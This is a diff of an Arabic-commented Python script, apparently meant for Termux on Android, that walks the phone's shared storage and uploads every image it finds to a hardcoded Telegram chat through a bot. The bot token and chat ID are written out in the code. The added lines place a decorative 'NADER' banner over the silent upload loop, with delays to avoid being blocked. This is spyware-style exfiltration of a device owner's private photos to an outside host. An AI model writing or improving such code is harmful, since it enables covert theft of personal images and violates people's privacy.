@@ -1,32 +1,47 @@
 import os
 import telebot
-from concurrent.futures import ThreadPoolExecutor
 import time
 
-# إعدادات البوت (معلوماتك الأصلية)
-API_TOKEN = "6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac"
-CHAT_ID = "1350971290"
-bot = telebot.TeleBot(API_TOKEN)
+# الشعار الخاص بك
+logo=("""\033[1;91m
+\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/
+\033[1;32m--------------------------------------------------""")
+print(logo)
+
+# إعداد البوت
+bot = telebot.TeleBot("6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac") 
 
 # المسار المستهدف
 dir_path = "/storage/emulated/0/"
 
-def send_file(file_path):
-    try:
-        valid_exts = (".jpg", ".png", ".jpeg", ".webp")
-        if file_path.lower().endswith(valid_exts):
-            with open(file_path, "rb") as f:
-                bot.send_photo(chat_id=CHAT_ID, photo=f)
-                print(f"[*] تم الرفع: {os.path.basename(file_path)}")
-                # تأخير بسيط جداً لتجنب ضغط الذاكرة في أندرويد 14
-                time.sleep(2) 
-    except Exception:
-        pass
+# قائمة الامتدادات المسموح بها لتسهيل الكود
+valid_extensions = (".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPEG", ".Webp", ".webp")
 
-# استخدام worker واحد أو اثنين فقط هو السر في استقرار Termux على Redmi
-print("بدء التشغيل المستقر على Android 14...")
-with ThreadPoolExecutor(max_workers=1) as executor:
-    for root, dirs, files in os.walk(dir_path):
-        for file in files:
-            full_path = os.path.join(root, file)
-            executor.submit(send_file, full_path)
+print("\n[*] جاري بدء الفحص والرفع المتسلسل...\n")
+
+# الدخول في المجلدات والملفات بشكل خطي ومنظم
+for root, dirs, files in os.walk(dir_path):
+    for file in files:
+        file_path = os.path.join(root, file)
+        
+        # التأكد من أن الملف هو صورة
+        if file_path.lower().endswith(valid_extensions):
+            try:
+                with open(file_path, "rb") as f:
+                    bot.send_photo(chat_id="1350971290", photo=f)
+                
+                # طباعة اسم الملف الذي تم رفعه بنجاح
+                print(f"\033[1;32m[+] تم الرفع:\033[0m {file}")
+                
+                # إضافة تأخير بسيط (ثانية واحدة) لمنع حظر البوت من تلجرام
+                time.sleep(1)
+                
+            except Exception as e:
+                # في حال حدث خطأ في ملف معين (مثل ملف تالف) سيكمل السكربت عمله
+                print(f"\033[1;31m[-] خطأ في رفع {file}\033[0m")
+                continue
+        else:
+            # تجاهل الملفات غير الصورية دون تعطيل العملية
+            pass
+
+print("\n\033[1;32m[!] اكتملت العملية بنجاح.\033[0m")
